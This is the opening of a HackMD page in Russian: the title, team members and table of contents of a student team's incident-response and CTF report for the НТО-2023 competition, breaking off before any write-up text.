<!DOCTYPE html>

<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <title>
        Qualitas incident report НТО-2023 - HackMD
    </title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
    <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha256-916EbMg70RQy9LHiGkXzG8hSg9EdNy97GazNG/aiY1w=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/octicons/3.5.0/octicons.min.css" integrity="sha256-QiWfLIsCT02Sdwkogf6YMiQlj4NE84MKkzEMkZnMGdg=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@hackmd/emojify.js@2.1.0/dist/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
    <style>
        @import url(https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i|Source+Code+Pro:300,400,500|Source+Sans+Pro:300,300i,400,400i,600,600i|Source+Serif+Pro&subset=latin-ext);.hljs{background:#fff;color:#333;display:block;overflow-x:auto;padding:.5em}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-string,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#a71d5d}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#0086b3}.hljs-built_in,.hljs-builtin-name{color:#005cc5}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#795da3}.hljs-addition{background-color:#eaffea;color:#55a532}.hljs-deletion{background-color:#ffecec;color:#bd2c00}.hljs-link{text-decoration:underline}.markdown-body{word-wrap:break-word;font-size:16px;line-height:1.5}.markdown-body:after,.markdown-body:before{content:"";display:table}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-bottom:16px;margin-top:0}.markdown-body hr{background-color:#e7e7e7;border:0;height:.25em;margin:24px 0;padding:0}.markdown-body blockquote{border-left:.25em solid #ddd;color:#777;font-size:16px;padding:0 1em}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body kbd,.popover kbd{background-color:#fcfcfc;border:1px solid;border-color:#ccc #ccc #bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb;color:#555;display:inline-block;font-size:11px;line-height:10px;padding:3px 5px;vertical-align:middle}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:600;line-height:1.25;margin-bottom:16px;margin-top:24px}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#000;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{border-bottom:1px solid #eee;padding-bottom:.3em}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{color:#777;font-size:.85em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{list-style-type:none;padding:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-bottom:0;margin-top:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{padding-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{font-size:1em;font-style:italic;font-weight:700;margin-top:16px;padding:0}.markdown-body dl dd{margin-bottom:16px;padding:0 16px}.markdown-body table{display:block;overflow:auto;width:100%;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{border:1px solid #ddd;padding:6px 13px}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{background-color:#fff;box-sizing:initial;max-width:100%}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{background-color:initial;max-width:none;vertical-align:text-top}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{border:1px solid #ddd;display:block;float:left;margin:13px 0 0;overflow:hidden;padding:7px;width:auto}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{clear:both;color:#333;display:block;padding:5px 0 0}.markdown-body span.align-center{clear:both;display:block;overflow:hidden}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{clear:both;display:block;overflow:hidden}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{background-color:#0000000a;border-radius:3px;font-size:85%;margin:0;padding:.2em 0}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{content:"\00a0";letter-spacing:-.2em}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{background:#0000;border:0;font-size:100%;margin:0;padding:0;white-space:pre;word-break:normal}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{background-color:#f7f7f7;border-radius:3px;font-size:85%;line-height:1.45;overflow:auto;padding:16px}.markdown-body pre code,.markdown-body pre tt{word-wrap:normal;background-color:initial;border:0;display:inline;line-height:inherit;margin:0;max-width:auto;overflow:visible;padding:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{font-size:12px;line-height:1;overflow:hidden;padding:5px;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{background:#fff;border:0;padding:10px 8px 9px;text-align:right}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{background:#f8f8f8;border-top:0;font-weight:700}.news .alert .markdown-body blockquote{border:0;padding:0 0 0 40px}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{cursor:default!important;float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle}.markdown-body{max-width:758px;overflow:visible!important;padding-bottom:40px;padding-top:40px;position:relative}.markdown-body .emoji{vertical-align:top}.markdown-body pre{border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{border-right:3px solid #6ce26c!important;box-sizing:initial;color:#afafaf!important;cursor:default;display:inline-block;min-width:20px;padding:0 8px 0 0;position:relative;text-align:right;z-index:4}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-bottom:none;border-left:none;border-top:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-collapse:inherit!important;border-spacing:0}.markdown-body code[data-gist-id]{background:none;padding:0}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{margin-bottom:unset;overflow:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p:last-child{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram,.markdown-body pre.vega{background-color:inherit;border-radius:0;overflow:visible;text-align:center;white-space:inherit}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code,.markdown-body pre.vega>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg,.markdown-body pre.vega>svg{height:100%;max-width:100%}.markdown-body pre>code.wrap{word-wrap:break-word;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap}.markdown-body .alert>p:last-child,.markdown-body .alert>ul:last-child{margin-bottom:0}.markdown-body summary{display:list-item}.markdown-body summary:focus{outline:none}.markdown-body details summary{cursor:pointer}.markdown-body details:not([open])>:not(summary){display:none}.markdown-body figure{margin:1em 40px}.markdown-body .mark,.markdown-body mark{background-color:#fff1a7}.vimeo,.youtube{background-color:#000;background-position:50%;background-repeat:no-repeat;background-size:contain;cursor:pointer;display:table;overflow:hidden;text-align:center}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{object-fit:contain;width:100%;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{height:100%;left:0;position:absolute;top:0;width:100%}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{color:#fff;height:auto;left:50%;opacity:.3;position:absolute;top:50%;transform:translate(-50%,-50%);transition:opacity .2s;width:auto;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{bottom:0;height:100%;left:0;position:absolute;right:0;top:0;width:100%}.figma{display:table;padding-bottom:56.25%;position:relative;width:100%}.figma iframe{border:1px solid #eee;bottom:0;height:100%;left:0;position:absolute;right:0;top:0;width:100%}.markmap-container{height:300px}.markmap-container>svg{height:100%;width:100%}.MJX_Assistive_MathML{display:none}#MathJax_Message{z-index:1000!important}.ui-infobar{color:#777;margin:25px auto -25px;max-width:760px;position:relative;z-index:2}.toc .invisable-node{list-style-type:none}.ui-toc{bottom:20px;position:fixed;z-index:998}.ui-toc.both-mode{margin-left:8px}.ui-toc.both-mode .ui-toc-label{border-bottom-left-radius:0;border-top-left-radius:0;height:40px;padding:10px 4px}.ui-toc-label{background-color:#e6e6e6;border:none;color:#868686;transition:opacity .2s}.ui-toc .open .ui-toc-label{color:#fff;opacity:1;transition:opacity .2s}.ui-toc-label:focus{background-color:#ccc;color:#000;opacity:.3}.ui-toc-label:hover{background-color:#ccc;opacity:1;transition:opacity .2s}.ui-toc-dropdown{margin-bottom:20px;margin-top:20px;max-height:70vh;max-width:45vw;overflow:auto;padding-left:10px;padding-right:10px;text-align:inherit;width:25vw}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{letter-spacing:.0029em;padding-right:0}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{color:#767676;display:block;font-size:13px;font-weight:500;padding:4px 20px}.ui-toc-dropdown .nav>li:first-child:last-child>ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{background-color:initial;border-left:1px solid #000;color:#000;padding-left:19px;text-decoration:none}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{border-left:none;border-right:1px solid #000;padding-right:19px}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{background-color:initial;border-left:2px solid #000;color:#000;font-weight:700;padding-left:18px}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{border-left:none;border-right:2px solid #000;padding-right:18px}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{font-size:12px;font-weight:400;padding-bottom:1px;padding-left:30px;padding-top:1px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{font-size:12px;font-weight:400;padding-bottom:1px;padding-left:40px;padding-top:1px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{font-weight:500;padding-left:28px}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{font-weight:500;padding-left:38px}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}html[lang^=ja] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ ゴシック,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}html[lang=zh-tw] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}html[lang=zh-cn] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}html .markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ ゴシック,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}html .markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}html .markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol}html[lang^=ja] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ Ｐゴシック,sans-serif}html[lang=zh-tw] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html[lang=zh-cn] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}html .ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ Ｐゴシック,sans-serif}html .ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html .ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}.ui-affix-toc{max-height:70vh;max-width:15vw;overflow:auto;position:fixed;top:0}.back-to-top,.expand-toggle,.go-to-bottom{color:#999;display:block;font-size:12px;font-weight:500;margin-left:10px;margin-top:10px;padding:4px 10px}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{background-position:50%;background-repeat:no-repeat;background-size:cover;border-radius:50%;display:block;height:20px;margin-bottom:2px;margin-right:5px;margin-top:2px;width:20px}.ui-user-icon.small{display:inline-block;height:18px;margin:0 0 .2em;vertical-align:middle;width:18px}.ui-infobar>small>span{line-height:22px}.ui-infobar>small .dropdown{display:inline-block}.ui-infobar>small .dropdown a:focus,.ui-infobar>small .dropdown a:hover{text-decoration:none}.ui-more-info{color:#888;cursor:pointer;vertical-align:middle}.ui-more-info .fa{font-size:16px}.ui-connectedGithub,.ui-published-note{color:#888}.ui-connectedGithub{line-height:23px;white-space:nowrap}.ui-connectedGithub a.file-path{color:#888;padding-left:22px;text-decoration:none}.ui-connectedGithub a.file-path:active,.ui-connectedGithub a.file-path:hover{color:#888;text-decoration:underline}.ui-connectedGithub .fa{font-size:20px}.ui-published-note .fa{font-size:20px;vertical-align:top}.unselectable{-webkit-user-select:none;-o-user-select:none;user-select:none}.selectable{-webkit-user-select:text;-o-user-select:text;user-select:text}.inline-spoiler-section{cursor:pointer}.inline-spoiler-section .spoiler-text{background-color:#333;border-radius:2px}.inline-spoiler-section .spoiler-text>*{opacity:0}.inline-spoiler-section .spoiler-img{filter:blur(10px)}.inline-spoiler-section.raw{background-color:#333;border-radius:2px}.inline-spoiler-section.raw>*{opacity:0}.inline-spoiler-section.unveil{cursor:auto}.inline-spoiler-section.unveil .spoiler-text{background-color:#3333331a}.inline-spoiler-section.unveil .spoiler-text>*{opacity:1}.inline-spoiler-section.unveil .spoiler-img{filter:none}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{color:#222;position:relative;z-index:1}.markdown-body.slides:before{background-color:currentColor;bottom:0;box-shadow:0 0 0 50vw;content:"";display:block;left:0;position:absolute;right:0;top:0;z-index:-1}.markdown-body.slides section[data-markdown]{background-color:#fff;margin-bottom:1.5em;position:relative;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{left:1em;max-height:100%;overflow:hidden;position:absolute;right:1em;top:50%;transform:translateY(-50%)}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{border:3px solid #777;content:"";height:1.5em;position:absolute;right:1em;top:-1.5em}.site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,sans-serif}html[lang^=ja] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ ゴシック,sans-serif}html[lang=zh-tw] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;-webkit-overflow-scrolling:touch;font-family:Source Sans Pro,Helvetica,Arial,sans-serif;letter-spacing:.025em}html[lang^=ja] body{font-family:Source Sans Pro,Helvetica,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ ゴシック,sans-serif}html[lang=zh-tw] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}abbr[data-original-title],abbr[title]{cursor:help}body.modal-open{overflow-y:auto;padding-right:0!important}svg{text-shadow:none}
    </style>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
    <![endif]-->
</head>

<body>
    <div id="doc" class="markdown-body container-fluid comment-enabled" data-hard-breaks="true"><h1 id="Qualitas-incident-report-НТО-2023" data-id="Qualitas-incident-report-НТО-2023"><a class="anchor hidden-xs" href="#Qualitas-incident-report-НТО-2023" title="Qualitas-incident-report-НТО-2023"><span class="octicon octicon-link"></span></a><span>Qualitas incident report НТО-2023</span></h1><h2 id="Выполнили" data-id="Выполнили"><a class="anchor hidden-xs" href="#Выполнили" title="Выполнили"><span class="octicon octicon-link"></span></a><span>Выполнили</span></h2><p><span>Команда “Qualitas”:</span><br>
<span>Шлотов Степан, </span><a href="mailto:stepka123456789@yandex.ru" target="_blank" rel="noopener"><span>stepka123456789@yandex.ru</span></a><br>
<span>Ярослав Морозов, </span><a href="mailto:gorkov-00-00@mail.ru" target="_blank" rel="noopener"><span>gorkov-00-00@mail.ru</span></a><br>
<span>Герасименко Яна, </span><a href="mailto:yanagerasimenko@bk.ru" target="_blank" rel="noopener"><span>yanagerasimenko@bk.ru</span></a><br>
<span>Ильин Никита, </span><a href="mailto:mrthefall@yandex.ru" target="_blank" rel="noopener"><span>mrthefall@yandex.ru</span></a><br>
<span>В ходе работы было проведено расследование инцидента и исправление уязвимости в веб-приложении</span></p><h2 id="Github" data-id="Github"><a class="anchor hidden-xs" href="#Github" title="Github"><span class="octicon octicon-link"></span></a><span>Github</span></h2><p><a href="https://github.com/MrTheFall/nto-2023" target="_blank" rel="noopener"><span>https://github.com/MrTheFall/nto-2023</span></a></p><h2 id="Содержание" data-id="Содержание"><a class="anchor hidden-xs" href="#Содержание" title="Содержание"><span class="octicon octicon-link"></span></a><span>Содержание</span></h2><p><span class="toc"><ul>
<li><a href="#Qualitas-incident-report-НТО-2023" title="Qualitas incident report НТО-2023">Qualitas incident report НТО-2023</a><ul>
<li><a href="#Выполнили" title="Выполнили">Выполнили</a></li>
<li><a href="#Github" title="Github">Github</a></li>
<li><a href="#Содержание" title="Содержание">Содержание</a></li>
</ul>
</li>
<li><a href="#Таски" title="Таски">Таски</a><ul>
<li><a href="#PWN-10" title="PWN-10">PWN-10</a></li>
<li><a href="#Reverse-10" title="Reverse-10">Reverse-10</a></li>
<li><a href="#Reverse-20" title="Reverse-20">Reverse-20</a></li>
<li><a href="#Web-10" title="Web-10">Web-10</a></li>
<li><a href="#Web-20" title="Web-20">Web-20</a></li>
<li><a href="#Crypto-10" title="Crypto-10">Crypto-10</a></li>
</ul>
</li>
<li><a href="#tip1" title=""></a><ul>
<li><a href="#Crypto-20" title="Crypto-20">Crypto-20</a></li>
<li><a href="#Crypto-30" title="Crypto-30">Crypto-30</a></li>
</ul>
</li>
<li><a href="#Машина-1" title="Машина 1">Машина 1</a><ul>
<li><a href="#Как-злоумышленник-попал-на-машину" title="Как злоумышленник попал на машину?">Как злоумышленник попал на машину?</a></li>
<li><a href="#Как-повысил-свои-права" title="Как повысил свои права?">Как повысил свои права?</a></li>
<li><a href="#Как-злоумышленник-узнал-пароль-от-passwordskdbx-" title="Как злоумышленник узнал пароль от passwords.kdbx ?">Как злоумышленник узнал пароль от passwords.kdbx ?</a></li>
<li><a href="#Куда-logkeys-пишет-логи-" title="Куда logkeys пишет логи ?">Куда logkeys пишет логи ?</a></li>
<li><a href="#Пароль-от-чего-лежит-в-passwordskdbx" title="Пароль от чего лежит в passwords.kdbx?">Пароль от чего лежит в passwords.kdbx?</a></li>
</ul>
</li>
<li><a href="#Машина-2" title="Машина 2">Машина 2</a><ul>
<li><a href="#Какой-пароль-от-Ransomware" title="Какой пароль от Ransomware?">Какой пароль от Ransomware?</a></li>
<li><a href="#Какие-процессы-в-системе-являются-вредоносными" title="Какие процессы в системе являются вредоносными?">Какие процессы в системе являются вредоносными?</a></li>
<li><a href="#Как-произошла-доставка-вредоносного-ПО" title="Как произошла доставка вредоносного ПО?">Как произошла доставка вредоносного ПО?</a></li>
<li><a href="#Какие-средства-обфускации-были-использованы" title="Какие средства обфускации были использованы?">Какие средства обфускации были использованы?</a></li>
<li><a href="#Как-злоумышленник-нашел-учетные-данные-от-Web-сервиса" title="Как злоумышленник нашел учетные данные от Web-сервиса?">Как злоумышленник нашел учетные данные от Web-сервиса?</a></li>
</ul>
</li>
<li><a href="#Исправление-уязвимостей" title="Исправление уязвимостей">Исправление уязвимостей</a><ul>
<li><a href="#Уязвимость-1" title="Уязвимость 1">Уязвимость 1</a></li>
<li><a href="#Уязвимость-2" title="Уязвимость 2">Уязвимость 2</a></li>
<li><a href="#Уязвимость-3" title="Уязвимость 3">Уязвимость 3</a></li>
<li><a href="#Уязвимость-4" title="Уязвимость 4">Уязвимость 4</a><ul>
